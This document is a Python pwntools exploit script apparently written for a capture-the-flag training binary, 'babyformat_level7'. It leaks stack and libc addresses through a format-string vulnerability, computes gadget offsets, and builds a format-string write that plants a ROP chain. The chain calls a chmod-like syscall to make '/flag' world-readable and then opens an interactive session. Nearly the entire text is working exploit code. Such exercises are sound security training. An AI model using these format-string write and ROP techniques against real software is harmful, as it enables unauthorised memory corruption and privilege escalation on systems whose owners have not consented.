#!/usr/bin/env python3
# -- coding: utf-8 --
# This exploit template was generated via:
# $ pwn template /challenge/babyformat_level7
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babyformat_level7')
context.arch = 'amd64'
context.terminal = ["tmux", "splitw", "-h"]
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
break *func+564
break *func+707
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

#info frame on main Saved registers: rip at 0x7fff5c390e48
#p/x $rbp at func 0x7fff5c390df0
#p/x $rsp st func 0x7fff5c390960
#p/x $rbp+8 at func 0x7fff5c390df8
#rdi = 0x7fff5c3909d0 
#leading_len = 14 + 121 + 1
#rbp + 8 - rsp = 1176 => 1176 /8 = 147 + 6 => 153
#rbp - rsp = 0x7ffc9ea77ef0 - 0x7ffc9ea77a60
#main_rip - rsp = 157 + 6 => 163
buffer = b"%p "*163
io.sendline(buffer)
io.recvuntil(b'Here is the result:')
io.recvline(keepends=False)
io.recvline(keepends=False)
data = io.recvline(keepends=False)
data = data.decode('utf-8').split(' ')
rbp_addr = int(data[151], 16) - 80
libc_base = int(data[162],16) - 0x24083
print("rbp_addr: ", hex(rbp_addr) )
print("libc_base: ", hex(libc_base))


pop_rdi = 0x023b6a
pop_rsi = 0x02601f
mov_eax = 0x10db64 #: mov eax, 0x5a ; syscall
leave_ret = 0x578c8 #: leave ; ret

target_values = [libc_base + pop_rdi, rbp_addr + 56, libc_base + pop_rsi, 0x1ff, libc_base + mov_eax, libc_base + leave_ret]
target_values = [(x - 136)%16**4 for x in target_values]
print('target_values: ', target_values)
new_str = ''
print("libc_base + pop_rdi: ", hex(libc_base + pop_rdi))
len_fmt_str = 192
new_str += f'%{(libc_base + pop_rdi)%16**4-136}' + '%c'*54 + '%hn'

len_of_new_str = len(new_str)
new_str = new_str.encode()
new_str = cyclic(len_fmt_str - len_of_new_str) + new_str
print("Lenght og new str", len(new_str))
new_str += p64(rbp_addr + 16)
print("New _addr: ", hex(rbp_addr + 16))


print("Len_of_str", len(new_str))
rop_chain = {
  rbp_addr+16: libc_base + pop_rdi, #new_rbp here is rip = rbp+8
  rbp_addr+24: rbp_addr + 56, #new address of flag
  rbp_addr+32: libc_base + pop_rsi,
  rbp_addr+40: 0o777,
  rbp_addr+48: libc_base + mov_eax,
  rbp_addr+56: "/flag\0\0\0",
  rbp_addr+8: libc_base + leave_ret
}

#rdi - rsp = 0x7ffc48e490b0 - 0x7ffc48e49040 = 112
#leaing_len = 136
#rdi - r



exploit = fmtstr_payload(31, rop_chain,  numbwritten=136, write_size='short', strategy='fast')
exploit_break = exploit.split(b'$')
#print(exploit_break)
new_exploit = b''
for i in range(len(exploit_break) - 1):
  x = exploit_break[i]
  x_break = x.split(b'%')
  tmp = b'%'.join(x_break[:-1])
  tmp = tmp.replace(b'c', b'%c')
  new_exploit += tmp
  new_exploit += b'%c'*(int(x_break[-1]) - 2) + b'%'
new_exploit += exploit_break[-1]
#print(new_exploit)
io.send(new_exploit)




#print("Data", data)
#rbp_addr = int(data, 16)



io.interactive()